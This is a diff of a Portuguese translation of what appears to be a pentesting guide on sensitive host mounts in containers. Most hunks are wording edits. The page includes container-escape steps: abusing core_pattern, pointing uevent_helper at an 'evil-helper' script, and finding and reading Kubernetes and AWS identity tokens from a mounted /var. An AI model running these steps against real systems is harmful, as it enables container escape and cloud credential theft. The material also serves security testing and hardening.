@@ -15,7 +15,7 @@ Este diretório permite o acesso para modificar variáveis do kernel, geralmente
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Permite definir um programa a ser executado na geração de arquivos de core com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
+- Permite definir um programa a ser executado na geração de arquivos de core, com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
 - **Exemplo de Teste e Exploração**:
 
 ```bash
@@ -42,7 +42,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
 
 #### **`/proc/sys/fs`**
 
-- De acordo com [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
+- Conforme [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
 - O acesso de escrita pode permitir vários ataques de negação de serviço contra o host.
 
 #### **`/proc/sys/fs/binfmt_misc`**
@@ -130,7 +130,7 @@ echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /ev
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Define uevent_helper para o manipulador malicioso
+#### Define uevent_helper para o helper malicioso
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -158,7 +158,7 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
 
 - Expondo interfaces para interagir com variáveis EFI na NVRAM.
-- Má configuração ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.
+- A má configuração ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.
 
 #### **`/sys/kernel/debug`**
 
@@ -167,7 +167,7 @@ cat /output %%%
 
 ### Vulnerabilidades do `/var`
 
-A pasta **/var** do host contém sockets de tempo de execução do contêiner e os sistemas de arquivos dos contêineres. Se esta pasta for montada dentro de um contêiner, esse contêiner terá acesso de leitura e escrita aos sistemas de arquivos de outros contêineres com privilégios de root. Isso pode ser abusado para pivotar entre contêineres, causar uma negação de serviço ou backdoor em outros contêineres e aplicativos que rodam neles.
+A pasta **/var** do host contém sockets de tempo de execução do contêiner e os sistemas de arquivos dos contêineres. Se esta pasta for montada dentro de um contêiner, esse contêiner terá acesso de leitura e gravação aos sistemas de arquivos de outros contêineres com privilégios de root. Isso pode ser abusado para pivotar entre contêineres, causar uma negação de serviço ou backdoor em outros contêineres e aplicativos que são executados neles.
 
 #### Kubernetes
 
@@ -226,8 +226,12 @@ Você também pode substituir arquivos de configuração, binários, serviços, 
 
 O contêiner pode ler tokens de serviceaccount do K8s ou tokens de webidentity da AWS, o que permite que o contêiner obtenha acesso não autorizado ao K8s ou à nuvem:
 ```bash
-/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
-/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
+<SNIP>
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
+/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
 #### Docker
 
@@ -249,7 +253,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Nota
 
-Os caminhos reais podem diferir em diferentes configurações, por isso a melhor opção é usar o comando **find** para localizar os sistemas de arquivos de outros contêineres.
+Os caminhos reais podem diferir em diferentes configurações, por isso a melhor opção é usar o comando **find** para localizar os sistemas de arquivos de outros contêineres e tokens de identidade SA / web.
 
 ### Referências
 
